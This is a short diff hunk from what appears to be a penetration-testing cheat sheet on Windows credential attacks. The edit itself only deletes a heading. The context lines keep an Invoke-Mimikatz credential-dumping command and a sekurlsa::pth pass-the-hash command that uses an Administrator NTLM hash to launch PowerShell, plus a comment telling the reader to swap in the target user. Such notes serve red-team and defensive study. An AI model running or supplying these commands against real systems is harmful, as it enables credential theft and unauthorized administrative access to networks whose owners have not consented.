@@ -24,8 +24,6 @@ Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::msv""ex
 
 Uses the NTLM hash directly to authenticate without knowing the real password.
 
-for NTLM Hash
-
 ```powershell
 sekurlsa::pth /user:**Administrator** /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain:pdc /run:powershell.exe
 # replace with target user
